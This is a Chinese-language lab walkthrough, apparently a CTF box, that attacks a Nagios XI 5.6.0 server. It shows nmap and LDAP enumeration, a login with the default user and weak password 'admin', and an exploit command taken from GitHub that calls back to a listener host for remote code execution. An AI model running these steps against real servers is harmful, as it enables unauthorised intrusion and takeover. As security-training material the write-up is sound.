针对目标服务器进行相应的端口扫描

```
sudo nmap -p- -vvv --min-rate 10000 192.168.108.136
```

![image-20241209211201562](https://s2.loli.net/2024/12/09/D2SQOR6Ybzm47VG.png)

针对目标服务器开放端口进行相应的端口服务探测

```
sudo nmap -p22,25,80,389,443,5667 -A -sV 192.168.108.136 -oG Monitoring.txt 
```

![image-20241209211216120](https://s2.loli.net/2024/12/09/r9kIfRDB4G63ac1.png)

22端口的openssh服务没有可以利用的内容，25端口的smtp服务我们暂时放一放，针对ldap的389端口我们优先进行下扫描

```
enum4linux -a 192.168.108.136
ldapsearch -x -s base namingcontexts -H ldap://192.168.108.136:389
```

没有获得什么内容，我们接下来针对80和443端口的web服务进行检查，发现两者均是一个服务

服务名称为Nagios XI，同时存在一个登录界面，也有一个about页面

![image-20241209212245401](https://s2.loli.net/2024/12/09/fx9tKTB7QdgzeR5.png)

我们优先搜索该应用是否存在默认登录账户密码或者可以利用的漏洞内容

Google搜索关键字：nagios xi default credentials

![image-20241209212339416](https://s2.loli.net/2024/12/09/sxrQNFZJPacyi6T.png)

username：nagiosadmin

password属于自行进行设置，我们尝试了几个弱密码，结果发现admin就是密码，我们成功完成了登录

同时我们尝试了这个登录只有在443端口可行，80端口不可行

![image-20241209212808612](https://s2.loli.net/2024/12/09/zFlPfK841VHMSRI.png)

可以从左下角看到相应的版本为5.6.0

Google搜索：nagios xi 5.6 0 exploit github

发现存在一个RCE漏洞可以利用，

![image-20241209212933686](https://s2.loli.net/2024/12/09/oIDcGHMQR89At5d.png)

我们尝试下载poc进行利用（https://github.com/hadrian3689/nagiosxi_5.6.6）

```
 python3 exploit.py -t 'https://192.168.108.136' -b /nagiosxi -u nagiosadmin -p admin -lh 192.168.45.190 -lp 443
```

![image-20241209214741597](https://s2.loli.net/2024/12/09/NIEWjuvap5hoJcC.png)

![image-20241209214750333](https://s2.loli.net/2024/12/09/6OmhZzSKx9Gov8b.png)
